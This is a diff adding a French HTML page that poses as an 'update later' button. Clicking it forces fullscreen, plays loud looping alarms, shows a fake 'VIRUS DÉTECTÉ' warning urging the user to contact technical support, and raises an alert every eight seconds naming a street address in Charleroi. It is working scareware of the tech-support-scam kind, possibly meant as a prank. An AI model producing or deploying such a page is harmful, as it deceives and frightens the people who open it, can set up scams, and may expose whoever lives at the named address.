@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<title>⚠️ VIRUS DÉTECTÉ ! ⚠️</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    background: black;
+    color: red;
+    font-family: 'Courier New', monospace;
+    overflow: hidden;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+  }
+  #fullscreen-btn {
+    background: red;
+    color: black;
+    border: none;
+    padding: 20px 40px;
+    font-size: 2em;
+    font-weight: bold;
+    cursor: pointer;
+    border-radius: 10px;
+    animation: pulse 1.5s infinite alternate;
+    user-select: none;
+  }
+  @keyframes pulse {
+    0% { box-shadow: 0 0 10px red; }
+    100% { box-shadow: 0 0 40px red; }
+  }
+  h1 {
+    font-size: 5em;
+    animation: flicker 1s infinite;
+    margin-top: 20px;
+    user-select: none;
+  }
+  @keyframes flicker {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.3; }
+  }
+  p {
+    font-size: 1.5em;
+    margin-top: 10px;
+    user-select: none;
+    text-align: center;
+  }
+</style>
+</head>
+<body>
+
+<button id="fullscreen-btn">Mettre a jour plus tard</button>
+
+<h1 style="display:none;">⚠️ VIRUS DÉTECTÉ ! ⚠️</h1>
+<p style="display:none;">
+  Votre appareil est gravement infecté.<br>
+  Contactez immédiatement le support technique.<br>
+  Ne fermez pas cette page !
+</p>
+
+<audio id="alarm-sound" loop>
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
+</audio>
+<audio id="beep-sound" loop>
+  <source src="https://www.soundjay.com/button/sounds/beep-07.mp3" type="audio/mpeg" />
+</audio>
+
+<script>
+  const btn = document.getElementById('fullscreen-btn');
+  const alarmSound = document.getElementById('alarm-sound');
+  const beepSound = document.getElementById('beep-sound');
+  const title = document.querySelector('h1');
+  const message = document.querySelector('p');
+
+  // Fonction pour activer le mode plein écran
+  function launchFullscreen(element) {
+    if(element.requestFullscreen) {
+      element.requestFullscreen();
+    } else if(element.mozRequestFullScreen) {
+      element.mozRequestFullScreen();
+    } else if(element.webkitRequestFullscreen) {
+      element.webkitRequestFullscreen();
+    } else if(element.msRequestFullscreen) {
+      element.msRequestFullscreen();
+    }
+  }
+
+  btn.onclick = () => {
+    launchFullscreen(document.documentElement);
+
+    // Affiche le message
+    btn.style.display = 'none';
+    title.style.display = 'block';
+    message.style.display = 'block';
+
+    // Lance les sons forts
+    alarmSound.volume = 1.0;
+    beepSound.volume = 0.5;
+    alarmSound.play();
+    beepSound.play();
+
+    // Pop-ups toutes les 8 secondes avec l'adresse
+    setInterval(() => {
+      alert("⚠️ VIRUS DÉTECTÉ !\nAdresse suspecte : rue du braquet 6061 Charleroi\nContactez le support !");
+    }, 8000);
+  };
+</script>
+
+</body>
+</html>
